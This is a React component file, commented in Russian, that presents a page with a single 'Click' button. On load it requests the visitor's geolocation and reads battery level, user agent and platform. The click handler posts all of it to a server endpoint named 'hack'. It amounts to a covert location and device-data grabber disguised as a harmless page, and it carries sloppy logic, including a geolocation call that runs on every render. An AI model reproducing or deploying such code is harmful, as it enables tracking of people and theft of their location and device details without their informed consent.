import { useEffect, useState } from 'react';
import './App.css';
import request from './server';

function App() {
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [mylocation, setLocation] = useState();

  const userAgent = navigator.userAgent; // Информация о браузере и операционной системе
  const platform = navigator.platform; // Информация об операционной системе



  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude; // Широта
        const longitude = position.coords.longitude; // Долгота
        setLocation(`https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`)
      },
      (error) => {
        console.error("Error getting geolocation:", error);
      }
    );
  } else {
    setLocation('Geolocation is not supported')
  }

  useEffect(() => {
    function handleBatteryChange() {
      navigator.getBattery().then((battery) => {
        const level = Math.floor((battery.level || battery.chargingTime / battery.dischargingTime) * 100);
        setBatteryLevel(level);
      });
    }

    navigator.getBattery().then((battery) => {
      handleBatteryChange();
      battery.addEventListener('levelchange', handleBatteryChange);
    });

    return () => {
      navigator.getBattery().then((battery) => {
        battery.removeEventListener('levelchange', handleBatteryChange);
      });
    };
  }, []);


  async function handleClick() {
    console.log('dads');
    await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform });
  }

  return (
    <>
      <button onClick={handleClick}>Click</button>
    </>
  );
}

export default App;